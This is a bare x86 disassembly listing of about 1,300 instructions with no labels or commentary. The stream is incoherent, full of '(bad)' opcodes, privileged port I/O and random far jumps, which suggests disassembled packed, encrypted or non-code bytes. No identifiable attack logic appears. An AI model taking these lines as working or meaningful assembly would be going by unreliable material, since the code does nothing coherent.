  404f70:	cld    
  404f71:	xor    bl,BYTE PTR [edx]
  404f73:	inc    ebx
  404f74:	jge    0x404fe9
  404f76:	jne    0x404fb5
  404f78:	mov    al,0x86
  404f7a:	or     dl,BYTE PTR [ecx+0xc]
  404f7d:	nop
  404f7e:	mov    dl,0x7f
  404f80:	or     cl,BYTE PTR [esi]
  404f82:	jle    0x404f1d
  404f84:	les    esi,FWORD PTR [esi+0x4a8f54c9]
  404f8a:	push   edx
  404f8b:	aaa    
  404f8c:	pop    ebp
  404f8d:	mov    ch,0x44
  404f8f:	adc    al,0xf5
  404f91:	adc    dl,dh
  404f93:	ret    0xfe69
  404f96:	pop    edx
  404f97:	jbe    0x404f7b
  404f99:	add    ah,BYTE PTR [ecx-0x49]
  404f9c:	mov    ds:0xf733879f,al
  404fa1:	stc    
  404fa2:	mov    ch,0x2d
  404fa4:	call   0xe2bb:0x6eefd6b5
  404fab:	xor    cl,BYTE PTR ds:0x1640ffbb
  404fb1:	and    al,0xcb
  404fb3:	in     al,0x89
  404fb5:	or     BYTE PTR [esi-0x4f6d95b4],dl
  404fbb:	mov    BYTE PTR [eax-0x51],cl
  404fbe:	xor    dl,ch
  404fc0:	stos   DWORD PTR es:[edi],eax
  404fc1:	mov    esi,0xb74ebac
  404fc6:	fstp   QWORD PTR [ebp-0x6fd64596]
  404fcc:	dec    edx
  404fcd:	jbe    0x404f8e
  404fcf:	fst    DWORD PTR [eax+0x4a577694]
  404fd5:	arpl   WORD PTR [ebx-0x11],di
  404fd8:	mov    eax,0x86e17afc
  404fdd:	fs lahf 
  404fdf:	ja     0x404fb6
  404fe1:	hlt    
  404fe2:	xchg   ebp,eax
  404fe3:	mov    ecx,?
  404fe5:	aas    
  404fe6:	icebp  
  404fe7:	push   ds
  404fe8:	lock mov edx,0x4203adf6
  404fef:	sub    edx,DWORD PTR [ecx]
  404ff1:	xor    BYTE PTR [edx-0x3f8b2324],bh
  404ff7:	mov    ecx,ebp
  404ff9:	sub    al,0x13
  404ffb:	lock xchg ebx,ecx
  404ffe:	and    BYTE PTR [edi+0x7dc67a45],0x56
  405005:	push   ebx
  405006:	sbb    eax,0x90b08d5b
  40500b:	sub    eax,0xe6f5b1e2
  405010:	test   eax,0x7fbdfe34
  405015:	rol    BYTE PTR [ebx],cl
  405017:	mov    DWORD PTR [esi],edi
  405019:	or     dl,BYTE PTR [ebp+0x6a69cea]
  40501f:	std    
  405020:	xchg   BYTE PTR [eax+ecx*1-0xc],dl
  405024:	std    
  405025:	jae    0x404fe4
  405027:	imul   esi,DWORD PTR [esi-0x3f],0x0
  40502b:	(bad)  gs:[esi+0x5c92c0ee]
  405032:	neg    al
  405034:	push   esi
  405035:	cli    
  405036:	add    BYTE PTR [ebp+0x51d74912],al
  40503c:	cmc    
  40503d:	sub    BYTE PTR [eax-0x75be3089],cl
  405043:	shr    BYTE PTR [edx],1
  405045:	repnz not esp
  405048:	(bad)  
  40504a:	jmp    0x807:0xbee3f69f
  405051:	scas   al,BYTE PTR es:[edi]
  405052:	or     DWORD PTR ds:0xf42be674,ebp
  405058:	cld    
  405059:	call   0xfaf26463
  40505e:	inc    esp
  40505f:	das    
  405060:	mov    edi,0x269fa5bc
  405065:	in     al,dx
  405066:	xchg   edi,eax
  405067:	lods   eax,DWORD PTR ds:[esi]
  405068:	pop    ds
  405069:	and    eax,0xb07ff1ea
  40506e:	push   ebx
  40506f:	adc    esi,DWORD PTR [esi-0x16b60923]
  405075:	pop    edx
  405076:	ds jecxz 0x4050d9
  405079:	inc    eax
  40507a:	jbe    0x4050ea
  40507c:	jns    0x405020
  40507e:	push   ecx
  40507f:	cmp    DWORD PTR [ebp+ebx*8+0x277c762a],0xffffff98
  405087:	pop    edx
  405088:	mov    ds:0x2943f3db,al
  40508d:	jmp    0x405016
  40508f:	leave  
  405090:	call   0x16b:0x878e9f3e
  405097:	in     al,dx
  405098:	add    al,0x61
  40509a:	mov    edi,0xae4e6be6
  40509f:	pop    ecx
  4050a0:	inc    ebx
  4050a1:	sti    
  4050a2:	sbb    DWORD PTR [ebx],ebx
  4050a4:	add    dl,BYTE PTR [ebx]
  4050a6:	jmp    0xbe80:0x7b355664
  4050ad:	sti    
  4050ae:	shl    DWORD PTR [esi],1
  4050b0:	fsub   st,st(6)
  4050b2:	xor    esp,ebx
  4050b4:	mov    esi,0xb18a20a5
  4050b9:	sub    BYTE PTR ds:0x348de27,bl
  4050bf:	les    edi,FWORD PTR [ebx+0x3]
  4050c2:	mov    al,ds:0xf495754
  4050c7:	shl    BYTE PTR [ecx-0x5ddb403],0x3b
  4050ce:	fld    QWORD PTR [esi+eax*2+0x1c2b4b05]
  4050d5:	inc    ebx
  4050d6:	lods   eax,DWORD PTR ds:[esi]
  4050d7:	xchg   DWORD PTR [edi+0x58],esp
  4050da:	inc    esi
  4050db:	or     bl,BYTE PTR [eax+0x3778338a]
  4050e1:	xor    BYTE PTR [esi+0x5e],cl
  4050e4:	fidiv  WORD PTR [edx+0x3a4b1641]
  4050ea:	dec    ecx
  4050eb:	sub    BYTE PTR [eax+0xfef8dc8],bh
  4050f1:	out    0x54,eax
  4050f3:	cli    
  4050f4:	in     al,dx
  4050f5:	scas   eax,DWORD PTR es:[edi]
  4050f6:	mov    bh,0xce
  4050f8:	scas   eax,DWORD PTR es:[edi]
  4050f9:	adc    DWORD PTR [ecx-0x35254cdc],0x84b8ac36
  405103:	fst    st(2)
  405105:	sub    bl,dl
  405107:	pusha  
  405108:	push   es
  405109:	mov    dh,0xc0
  40510b:	mov    ebx,0x231d5653
  405110:	jecxz  0x40513e
  405112:	and    bh,0x67
  405115:	pop    edi
  405116:	out    dx,eax
  405117:	je     0x405134
  405119:	push   esp
  40511a:	push   edx
  40511c:	stc    
  40511d:	icebp  
  40511e:	nop
  40511f:	dec    edi
  405120:	test   DWORD PTR [ecx+0x4345a14],esp
  405126:	jmp    0x47f:0x8f40375
  40512d:	mov    ds:0x360b2205,eax
  405132:	inc    ebp
  405133:	inc    esp
  405134:	jno    0x405121
  405136:	loop   0x405110
  405138:	imul   esi,DWORD PTR [edx-0x7c],0xc35d4c7f
  40513f:	jl     0x405110
  405141:	ins    BYTE PTR es:[edi],dx
  405142:	imul   esi,DWORD PTR [ecx+0x41],0x6f2339d9
  405149:	or     edi,DWORD PTR [ebp+0x8908351]
  40514f:	repnz and BYTE PTR [ebx+0x233db540],al
  405156:	dec    edi
  405157:	in     eax,dx
  405158:	adc    ebp,DWORD PTR [eax]
  40515a:	es test eax,0x3ec38383
  405160:	jp     0x405138
  405162:	push   esi
  405163:	repnz and DWORD PTR ds:0xc485198b,edi
  40516a:	push   0x6bcd418b
  40516f:	or     eax,0x132e49d1
  405174:	stos   DWORD PTR es:[edi],eax
  405175:	not    DWORD PTR [ebx]
  405177:	xor    bh,BYTE PTR [esi]
  405179:	shl    BYTE PTR [esi-0x11],0xf8
  40517d:	and    al,0xd2
  40517f:	fistp  QWORD PTR [ecx-0x3c]
  405182:	fs retf 0x4363
  405186:	push   esi
  405187:	aas    
  405188:	cmp    al,0x1f
  40518a:	mov    ecx,0xdba9f3b7
  40518f:	addr16 sbb eax,0xe3a2059d
  405195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405196:	cdq    
  405197:	pop    ebp
  405198:	xor    bl,BYTE PTR [edx-0x59]
  40519b:	ins    BYTE PTR es:[edi],dx
  40519c:	xchg   DWORD PTR [ebp-0x1ad1ff2e],esp
  4051a2:	nop
  4051a3:	loop   0x40513a
  4051a5:	stc    
  4051a6:	jle    0x405219
  4051a8:	out    dx,al
  4051a9:	addr16 jb 0x4051d2
  4051ac:	enter  0x7854,0x22
  4051b0:	mov    bh,0x4d
  4051b2:	repnz or eax,0x9fc22a71
  4051b8:	cmp    eax,edx
  4051ba:	mov    al,ds:0xbc8aecb2
  4051bf:	inc    ecx
  4051c0:	enter  0xa094,0x9c
  4051c4:	jmp    0x4051c6
  4051c6:	jno    0x405180
  4051c8:	add    eax,0x7eebf645
  4051cd:	popf   
  4051ce:	clc    
  4051cf:	xor    eax,0xff32979a
  4051d4:	into   
  4051d5:	(bad)  
  4051d7:	push   ecx
  4051d8:	retf   
  4051d9:	fistp  QWORD PTR [ebp+0x1c0c1a77]
  4051df:	jae    0x40522e
  4051e1:	rcl    ecx,1
  4051e3:	imul   ebx,DWORD PTR [eax],0xd4ba310e
  4051e9:	into   
  4051ea:	sar    edi,cl
  4051ec:	fsubrp st(3),st
  4051ee:	test   dh,0x91
  4051f1:	jb     0x4051a6
  4051f3:	add    bl,BYTE PTR [edx-0x7b]
  4051f6:	imul   ebx,DWORD PTR ds:0xdef3a065,0x7306bfd0
  405200:	aaa    
  405201:	xor    eax,0x35475380
  405207:	aas    
  405208:	mov    ds:0x1d7e9a28,eax
  40520d:	xlat   BYTE PTR ds:[ebx]
  40520e:	mov    BYTE PTR [edi+0x48],dh
  405211:	mov    edx,0x632597a2
  405216:	call   0x643e:0x2a606c2a
  40521d:	cmp    bl,ah
  40521f:	cmp    al,0x43
  405221:	and    al,0x20
  405223:	xlat   BYTE PTR ds:[ebx]
  405224:	sbb    DWORD PTR ds:0x3ffb998e,ecx
  40522a:	fld    TBYTE PTR [ebp+0x1fd9689c]
  405230:	adc    ch,BYTE PTR [edx]
  405232:	outs   dx,DWORD PTR ds:[esi]
  405233:	fs call 0x40b8e9db
  405239:	xchg   ecx,eax
  40523a:	adc    al,0xfc
  40523c:	push   ecx
  40523d:	mov    edx,0xca4971ff
  405242:	sbb    cl,0x27
  405245:	(bad)  
  405246:	xchg   edi,eax
  405247:	add    eax,0x22b3a3da
  40524c:	jecxz  0x40526e
  40524e:	int3   
  40524f:	add    BYTE PTR [esi+0x69],0xdc
  405253:	ins    DWORD PTR es:[edi],dx
  405254:	mov    al,ds:0xcde11ad8
  405259:	cmp    bh,BYTE PTR [ebx+edi*8]
  40525c:	or     eax,0x8b9dac7f
  405261:	sub    al,BYTE PTR [ecx+eax*4]
  405264:	jecxz  0x40528e
  405266:	jbe    0x405251
  405268:	mov    ds:0x732f6e5e,al
  40526d:	push   cs
  40526e:	call   0xd84a:0x275bb60c
  405275:	clc    
  405276:	(bad)  
  405277:	out    dx,al
  405278:	push   ebp
  405279:	daa    
  40527a:	sbb    DWORD PTR [esi-0x40568149],ebp
  405280:	and    edi,DWORD PTR [ecx]
  405282:	sbb    eax,0xf5fd637
  405287:	dec    ebx
  405288:	mov    esi,0x8ab9340d
  40528d:	cmp    ah,BYTE PTR [eax+0x48fe7244]
  405293:	xor    BYTE PTR [esi],bh
  405295:	or     al,BYTE PTR [edi-0x65]
  405298:	js     0x40530a
  40529a:	cmp    al,0x7c
  40529c:	pop    ecx
  40529d:	pcmpeqb mm6,QWORD PTR [eax+0x74e05529]
  4052a4:	and    DWORD PTR [ebx-0x48],edx
  4052a7:	push   ecx
  4052a8:	or     al,0x54
  4052aa:	addr16 pop ss
  4052ac:	int    0xdd
  4052ae:	leave  
  4052af:	inc    ecx
  4052b0:	adc    edx,DWORD PTR [ebx*2-0x6831cc91]
  4052b7:	mov    WORD PTR [si],fs
  4052ba:	ins    BYTE PTR es:[edi],dx
  4052bb:	mov    cs,WORD PTR [esi+0x51]
  4052be:	push   0x655870d4
  4052c3:	xor    dl,cl
  4052c5:	into   
  4052c6:	add    al,0x32
  4052c8:	aaa    
  4052c9:	mov    ds,WORD PTR cs:[eax]
  4052cc:	aam    0xb8
  4052ce:	ret    0x10d1
  4052d1:	mov    ah,0xb2
  4052d3:	mov    edi,0x2e50d92b
  4052d8:	adc    DWORD PTR [edi],0xffffffd3
  4052db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052dc:	(bad)  
  4052dd:	ds scas al,BYTE PTR es:[edi]
  4052df:	pop    ds
  4052e0:	dec    esp
  4052e1:	or     DWORD PTR [eax],ecx
  4052e3:	xchg   edi,eax
  4052e4:	push   edx
  4052e5:	jmp    0x40530a
  4052e7:	aas    
  4052e8:	lods   al,BYTE PTR ds:[esi]
  4052e9:	mov    ebx,0x6aaf3496
  4052ee:	nop
  4052ef:	add    ebx,esp
  4052f1:	frstor [ebx+edi*2+0x4bf82e7b]
  4052f8:	fwait
  4052f9:	pop    es
  4052fa:	cwde   
  4052fb:	dec    esp
  4052fc:	pushf  
  4052fd:	dec    BYTE PTR [esi-0x2d]
  405300:	iret   
  405301:	not    BYTE PTR [edx+ebp*8+0x7e869d7f]
  405308:	adc    al,0x6e
  40530a:	pop    ebx
  40530b:	sbb    edi,DWORD PTR [esi+edi*8]
  40530e:	sub    bl,BYTE PTR [esi]
  405310:	out    dx,eax
  405311:	or     DWORD PTR [ebp+0x6f],edi
  405314:	dec    eax
  405315:	inc    ebx
  405316:	dec    esp
  405317:	fadd   DWORD PTR [edx-0x4901d1cd]
  40531d:	mov    al,ds:0x12f6b047
  405322:	and    bh,bl
  405324:	cwde   
  405325:	xchg   ecx,eax
  405326:	dec    esi
  405327:	add    ecx,DWORD PTR [edi+0x6d40f6f8]
  40532d:	rcr    BYTE PTR [edi-0x7f07c586],cl
  405333:	xor    BYTE PTR [edi-0x2a],0x8
  405337:	retf   
  405338:	jmp    0x51fefbbf
  40533d:	xor    dl,BYTE PTR [edx+0x47f264a5]
  405343:	ret    0x5f20
  405346:	pop    ebp
  405347:	out    0x9e,al
  405349:	dec    eax
  40534a:	cmp    DWORD PTR [eax],ecx
  40534c:	dec    esi
  40534d:	aaa    
  40534e:	stc    
  40534f:	ror    DWORD PTR [esi],cl
  405351:	repz das 
  405353:	enter  0x3e59,0xed
  405357:	test   ah,dh
  405359:	in     eax,dx
  40535a:	mov    ebp,0x61dc7c1f
  40535f:	push   0x19baec38
  405364:	shl    DWORD PTR [edx+0x37],cl
  405367:	xchg   BYTE PTR [ebx-0x39c140a7],dh
  40536d:	xchg   BYTE PTR [edi-0x2c1d4b33],dl
  405373:	outs   dx,BYTE PTR ds:[esi]
  405374:	xlat   BYTE PTR ds:[ebx]
  405375:	inc    eax
  405376:	hlt    
  405377:	aad    0xdc
  405379:	repnz cdq 
  40537b:	sbb    DWORD PTR [edx],ecx
  40537d:	int3   
  40537e:	je     0x40537d
  405380:	xor    DWORD PTR [ebp+eiz*2-0x16],0x7fd40983
  405388:	push   es
  405389:	out    0xb5,eax
  40538b:	dec    ebx
  40538c:	idiv   BYTE PTR [edx-0x5e]
  40538f:	aaa    
  405390:	lds    eax,FWORD PTR [ebx-0x5e60ace0]
  405396:	add    eax,0x7d30abca
  40539b:	push   eax
  40539d:	(bad)  
  40539e:	mov    al,0xee
  4053a0:	(bad)  
  4053a1:	lods   al,BYTE PTR ds:[esi]
  4053a2:	add    al,0xe9
  4053a4:	(bad)  
  4053a5:	stos   BYTE PTR es:[edi],al
  4053a6:	mov    ch,0x12
  4053a8:	cwde   
  4053a9:	in     al,0x73
  4053ab:	ss add eax,0x9ad063c4
  4053b1:	mov    esi,0x6cf0e910
  4053b6:	gs adc ecx,eax
  4053b9:	cmp    al,0xf3
  4053bb:	pop    esi
  4053bc:	retf   
  4053bd:	(bad)  
  4053bf:	or     DWORD PTR [edx-0x7f],ecx
  4053c2:	push   ss
  4053c3:	in     al,dx
  4053c4:	add    eax,0x7757702f
  4053c9:	mov    bh,0x84
  4053cb:	test   DWORD PTR [ecx+0x17],esi
  4053ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053cf:	std    
  4053d0:	add    ebx,DWORD PTR [ecx+0xb]
  4053d3:	jmp    0x4053af
  4053d5:	sub    DWORD PTR [eax],ebx
  4053d7:	test   DWORD PTR [edi+ebp*2],edi
  4053da:	push   ds
  4053db:	popf   
  4053dc:	clc    
  4053dd:	push   ebp
  4053de:	jecxz  0x4053ef
  4053e0:	inc    esi
  4053e1:	ret    
  4053e2:	sub    ebx,DWORD PTR [ebx]
  4053e4:	ds jno 0x4053e5
  4053e7:	imul   ebx,DWORD PTR [ebx-0x59],0xffffffb2
  4053eb:	xor    cl,bl
  4053ed:	les    ecx,FWORD PTR [eax]
  4053ef:	arpl   WORD PTR [ebx+0x52],dx
  4053f2:	xchg   ecx,eax
  4053f3:	cs in  al,0x35
  4053f6:	shl    DWORD PTR [esi+0x17],0x2e
  4053fa:	pusha  
  4053fb:	aas    
  4053fc:	jbe    0x405450
  4053fe:	inc    edi
  4053ff:	in     eax,dx
  405400:	or     edi,DWORD PTR [ebp-0x75]
  405403:	retf   
  405404:	adc    al,0x58
  405406:	mov    ebx,eax
  405408:	cmp    dl,bl
  40540a:	ja     0x40538f
  40540c:	fsubrp st(5),st
  40540e:	xchg   esp,eax
  40540f:	add    esp,DWORD PTR [ebx+ebx*4+0x6b]
  405413:	(bad)  
  405415:	ins    BYTE PTR es:[edi],dx
  405416:	or     ch,bh
  405418:	cld    
  405419:	(bad)  
  40541a:	jne    0x4053c6
  40541c:	xchg   edx,eax
  40541d:	fisttp QWORD PTR [esi+0x1f9db0c8]
  405423:	xchg   ecx,eax
  405424:	in     eax,dx
  405425:	(bad)
  405428:	jnp    0x40541d
  40542a:	sbb    DWORD PTR [esi],ebx
  40542c:	aaa    
  40542d:	xor    BYTE PTR [edi+0x63],0x9c
  405431:	mov    ds:0xf4014b6c,eax
  405436:	or     BYTE PTR [eax+0x2e],0xe2
  40543a:	cld    
  40543b:	mov    eax,ds:0x98db79bc
  405440:	test   edx,eax
  405442:	in     eax,dx
  405443:	(bad)  
  405444:	sar    DWORD PTR [edi-0x2ffbdae],cl
  40544a:	inc    al
  40544c:	jp     0x4054a4
  40544e:	out    0xb7,eax
  405450:	pop    es
  405451:	cmp    DWORD PTR [ebx-0x5b370a50],eax
  405457:	inc    eax
  405458:	inc    ebx
  405459:	call   esp
  40545b:	(bad)  
  40545c:	pushf  
  40545d:	mov    esp,0x2481e55a
  405462:	rcr    ebx,0x85
  405465:	dec    esi
  405466:	in     eax,0xc6
  405468:	mov    bh,0xcc
  40546a:	test   eax,0xdf5f0afb
  40546f:	mov    DWORD PTR es:[edx],eax
  405472:	in     eax,dx
  405473:	and    cl,BYTE PTR [ecx+0x3813c98c]
  405479:	adc    BYTE PTR [esi],bh
  40547b:	outs   dx,BYTE PTR ds:[esi]
  40547c:	mov    bl,0x2f
  40547e:	xchg   ecx,eax
  40547f:	sub    edi,DWORD PTR [edi+eax*8-0x6e68e4a7]
  405486:	xchg   esi,eax
  405487:	scas   eax,DWORD PTR es:[edi]
  405488:	mov    edx,0x2627a7ed
  40548d:	popf   
  40548e:	das    
  40548f:	sub    cl,BYTE PTR [eax+edi*2+0x123a3d3c]
  405496:	pusha  
  405497:	adc    BYTE PTR [edx+eax*4+0x77],dl
  40549b:	xor    ebx,0xd834fe2b
  4054a1:	stos   DWORD PTR es:[edi],eax
  4054a2:	popf   
  4054a3:	sub    al,0xa7
  4054a5:	inc    edx
  4054a6:	retf   0x9cb2
  4054a9:	repz xchg ecx,eax
  4054ab:	xor    edx,DWORD PTR [edi+0x4f]
  4054ae:	ins    DWORD PTR es:[edi],dx
  4054af:	mov    cl,0x7
  4054b1:	les    edx,FWORD PTR [ebx+0xaa41279]
  4054b7:	sub    esi,DWORD PTR [ecx+0x4f]
  4054ba:	gs es (bad) 
  4054bd:	push   eax
  4054be:	pop    edx
  4054bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054c0:	mov    dh,0x13
  4054c2:	cli    
  4054c3:	(bad)  
  4054c5:	mov    dl,0x38
  4054c7:	ret    0x56d0
  4054ca:	bound  eax,QWORD PTR [edi]
  4054cc:	imul   esp,DWORD PTR [esp+esi*8+0x6a],0x78287ccc
  4054d4:	xchg   edi,eax
  4054d5:	ret    
  4054d6:	adc    ah,BYTE PTR [esi-0x7d433d9f]
  4054dc:	mov    esi,0x879cd993
  4054e1:	mov    eax,0x7eb13ede
  4054e6:	sbb    ch,BYTE PTR [eax+0x4b]
  4054e9:	push   cs
  4054ea:	in     al,0xb7
  4054ec:	mov    dh,0xb8
  4054ee:	push   eax
  4054ef:	xchg   ecx,eax
  4054f0:	cli    
  4054f1:	lods   al,BYTE PTR ds:[esi]
  4054f2:	iret   
  4054f3:	or     eax,0xdf6614b0
  4054f8:	jo     0x4054e7
  4054fa:	les    eax,FWORD PTR [ebx+0x365b7bd9]
  405500:	stos   BYTE PTR es:[edi],al
  405501:	test   DWORD PTR ds:0x8b2cae01,0x5ef596f7
  40550b:	popf   
  40550c:	mov    dl,BYTE PTR [eax]
  40550e:	push   ebp
  40550f:	int    0x2
  405511:	(bad)  
  405512:	mov    ah,0xa4
  405514:	bswap  ebp
  405516:	aam    0xe7
  405518:	dec    edi
  405519:	cmp    BYTE PTR [ebx+ebx*1-0x6034ddc6],ah
  405520:	lods   eax,DWORD PTR ds:[esi]
  405521:	inc    eax
  405522:	xchg   edx,eax
  405523:	div    DWORD PTR [ebx-0x799fb0d5]
  405529:	mov    ebp,0xcc62c69b
  40552e:	shl    DWORD PTR [edx],0x12
  405531:	pop    esp
  405532:	loopne 0x4054d8
  405534:	jno    0x40556d
  405536:	ror    BYTE PTR [eax],0x38
  405539:	adc    ah,0xac
  40553c:	cmp    bh,bh
  40553e:	retf   0x3b7
  405541:	dec    edx
  405542:	ins    DWORD PTR es:[edi],dx
  405543:	pusha  
  405544:	out    dx,eax
  405545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405546:	inc    ebp
  405547:	adc    cl,al
  405549:	mov    dh,0xb4
  40554b:	jecxz  0x40557e
  40554d:	cs mov esp,0x67c850c1
  405553:	adc    esp,esi
  405555:	loope  0x4054e4
  405557:	adc    al,0xc1
  405559:	sahf   
  40555a:	neg    BYTE PTR [eax]
  40555c:	inc    edi
  40555d:	adc    BYTE PTR [esi-0x6],ch
  405560:	imul   ebx,DWORD PTR [esi+0x2d],0x39
  405564:	stc    
  405565:	bound  eax,QWORD PTR ds:0xff28b28
  40556b:	inc    esi
  40556c:	mov    BYTE PTR [ebx+esi*2],bl
  40556f:	pop    ebx
  405570:	push   ebp
  405571:	push   ss
  405572:	ret    
  405573:	xchg   esi,eax
  405574:	test   DWORD PTR [edx+edi*8],ebp
  405577:	pop    esi
  405578:	aad    0xae
  40557a:	mov    al,0xed
  40557c:	(bad)  
  40557d:	retf   0x4a4d
  405580:	std    
  405581:	cld    
  405582:	jae    0x405599
  405584:	sahf   
  405585:	sub    eax,0x2a44e76f
  40558a:	popf   
  40558b:	int    0xdd
  40558d:	sbb    dl,BYTE PTR [ebx+0x2fa85687]
  405593:	pop    esi
  405594:	repnz inc esp
  405596:	loop   0x405542
  405598:	outs   dx,BYTE PTR ds:[esi]
  405599:	pop    ecx
  40559a:	mov    eax,0xd276655b
  40559f:	jne    0x405567
  4055a1:	loopne 0x405561
  4055a3:	and    dh,BYTE PTR [esi-0x1ea6521c]
  4055a9:	jno    0x405603
  4055ab:	jle    0x40556c
  4055ad:	ins    BYTE PTR es:[edi],dx
  4055ae:	push   0x2d
  4055b0:	inc    ebp
  4055b1:	retf   
  4055b2:	ja     0x4055d7
  4055b4:	in     eax,0xb2
  4055b6:	sub    DWORD PTR ds:0x955f221b,0xffffffbf
  4055bd:	scas   eax,DWORD PTR es:[edi]
  4055be:	sahf   
  4055bf:	das    
  4055c0:	daa    
  4055c1:	jne    0x405552
  4055c3:	sbb    BYTE PTR [esi-0x4f],ch
  4055c6:	sbb    eax,0x89220517
  4055cb:	retf   
  4055cc:	push   0x5f6ca3bc
  4055d1:	sbb    al,0x2d
  4055d3:	lds    esp,FWORD PTR ds:0x5828a565
  4055d9:	mov    dh,0x20
  4055db:	aad    0xa
  4055dd:	lea    edi,[ebp+0x14]
  4055e0:	mov    ebp,0x2568bb89
  4055e5:	or     DWORD PTR [esi-0x73],ebx
  4055e8:	rcr    BYTE PTR [edx+0xa],1
  4055eb:	pop    ecx
  4055ec:	mov    edx,DWORD PTR [ebx]
  4055ee:	in     eax,0x1d
  4055f0:	pop    ecx
  4055f1:	ss push eax
  4055f3:	ret    0xc6ea
  4055f6:	mov    edx,0xc900e7c3
  4055fb:	inc    ecx
  4055fc:	mov    eax,ds:0x831332dc
  405601:	ficomp DWORD PTR [ebx+0x5]
  405604:	jo     0x405679
  405606:	xchg   esi,eax
  405607:	mov    esi,0x371ef90f
  40560c:	call   0x64aff331
  405611:	into   
  405612:	cmc    
  405613:	out    dx,eax
  405614:	imul   DWORD PTR [eax]
  405616:	cmc    
  405617:	jo     0x4055cc
  405619:	aaa    
  40561a:	sbb    ecx,DWORD PTR cs:[edx]
  40561d:	mov    esp,edx
  40561f:	sbb    eax,0x2fc0cd25
  405624:	(bad)  
  405625:	repnz nop
  405627:	ins    DWORD PTR es:[edi],dx
  405628:	cmp    al,BYTE PTR [ebp+0x39]
  40562b:	retf   
  40562c:	jne    0x4055ff
  40562e:	sbb    ecx,ebx
  405630:	add    edx,DWORD PTR [edx]
  405632:	cmp    DWORD PTR [ebp+0x27],edx
  405635:	inc    ebx
  405636:	pop    esp
  405637:	in     al,dx
  405638:	jbe    0x4055e3
  40563a:	push   edi
  40563b:	mov    dl,0x60
  40563d:	add    DWORD PTR [edi-0x338c976b],esp
  405643:	jecxz  0x405689
  405645:	xor    al,0xd7
  405647:	adc    al,0x3b
  405649:	push   ds
  40564a:	out    0x34,eax
  40564c:	enter  0x7856,0xec
  405650:	jnp    0x4056c3
  405652:	nop
  405653:	jle    0x40564a
  405655:	push   0x64
  405657:	sbb    BYTE PTR [ecx+0x14],cl
  40565a:	mov    edx,0x34ca8145
  40565f:	xor    edx,DWORD PTR [ecx]
  405661:	jno    0x405691
  405663:	cld    
  405664:	mov    esi,DWORD PTR [ecx]
  405666:	cld    
  405667:	ss call 0x55ba74ab
  40566d:	push   edi
  40566e:	mov    al,0x90
  405670:	sti    
  405671:	add    eax,ebx
  405673:	sub    eax,0xf042b173
  405678:	bound  ebp,QWORD PTR [ecx-0x35]
  40567b:	sub    al,0xfe
  40567d:	pop    edi
  40567e:	mov    ebx,0x39edc5ae
  405683:	dec    ecx
  405684:	enter  0xef9e,0xe0
  405688:	je     0x4056c3
  40568a:	inc    ebx
  40568b:	cwde   
  40568c:	and    BYTE PTR [edi],bl
  40568e:	xchg   ecx,eax
  40568f:	daa    
  405690:	xchg   ebp,eax
  405691:	imul   ebx,DWORD PTR [ebp-0x2191ea5],0xffffffc2
  405698:	pop    es
  405699:	xor    dl,dh
  40569b:	inc    esi
  40569c:	jns    0x405719
  40569e:	pop    ebp
  40569f:	nop
  4056a0:	rcl    BYTE PTR [edx+0x5a1ee4a0],cl
  4056a6:	xchg   ebp,eax
  4056a7:	dec    esi
  4056a8:	leave  
  4056a9:	add    al,0x31
  4056ab:	or     al,0x8f
  4056ad:	lods   eax,DWORD PTR ds:[esi]
  4056ae:	mov    ch,0x17
  4056b0:	adc    ecx,0xffffffb8
  4056b3:	adc    ebx,DWORD PTR [eax]
  4056b5:	xor    BYTE PTR [ecx+0x58883368],bh
  4056bb:	cmc    
  4056bc:	cwde   
  4056bd:	(bad)  
  4056be:	fldcw  WORD PTR [edx+0x77da8e44]
  4056c4:	pop    edi
  4056c5:	push   es
  4056c6:	mov    ah,0x84
  4056c8:	test   BYTE PTR [edi+0x68],dl
  4056cb:	inc    edi
  4056cc:	or     BYTE PTR [ebx-0x5b],bl
  4056cf:	es jno 0x40565c
  4056d2:	out    dx,eax
  4056d3:	adc    BYTE PTR [eax+0x2],ah
  4056d6:	cmp    DWORD PTR ds:0x1741a349,edx
  4056dc:	or     eax,0x797ecfc5
  4056e1:	(bad)  
  4056e2:	icebp  
  4056e3:	mov    bl,0xb
  4056e5:	add    bh,cl
  4056e7:	outs   dx,BYTE PTR ds:[esi]
  4056e8:	sbb    BYTE PTR [esi],cl
  4056ea:	pop    ecx
  4056eb:	inc    edx
  4056ec:	das    
  4056ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056ee:	(bad)  
  4056f0:	pusha  
  4056f1:	lods   al,BYTE PTR ds:[esi]
  4056f2:	loope  0x405693
  4056f4:	xchg   ecx,eax
  4056f5:	xor    DWORD PTR [edx+edx*1+0x6cbd6a9e],edi
  4056fc:	push   edx
  4056fd:	in     al,dx
  4056fe:	outs   dx,DWORD PTR ds:[esi]
  4056ff:	pop    ebx
  405700:	pand   mm6,mm6
  405703:	fld    st(3)
  405705:	(bad)
  405708:	mov    eax,DWORD PTR [esi]
  40570a:	ss mov eax,0x4582a72f
  405710:	adc    eax,0x17bd2a40
  405715:	or     DWORD PTR ds:0x5b657c49,edi
  40571b:	out    0x44,eax
  40571d:	repnz inc ebx
  40571f:	push   0x17
  405721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405722:	call   0xc6c5:0xae31f5a8
  405729:	add    cl,BYTE PTR [ebp+0x1c]
  40572c:	or     al,dl
  40572e:	push   edi
  40572f:	data16 rcr BYTE PTR [edx+0x2011cc5],0x4e
  405737:	and    dh,dl
  405739:	(bad)  
  40573a:	stos   DWORD PTR es:[edi],eax
  40573b:	push   cs
  40573c:	ins    DWORD PTR es:[edi],dx
  40573d:	mov    ecx,0xf14c14d0
  405742:	jbe    0x405725
  405744:	lock scas al,BYTE PTR es:[edi]
  405746:	xchg   edx,eax
  405747:	je     0x405728
  405749:	(bad)  
  40574a:	cmp    dl,BYTE PTR [ecx]
  40574c:	mov    edx,0x1e0fed83
  405751:	ss std 
  405753:	adc    bl,BYTE PTR [edi]
  405755:	in     eax,dx
  405756:	sub    edx,DWORD PTR [edx+0x8]
  405759:	add    ebp,DWORD PTR ds:[ecx+0x639a20bd]
  405760:	imul   eax,DWORD PTR [ebx+0x36],0x7b8a585f
  405767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405768:	retf   0xbe7d
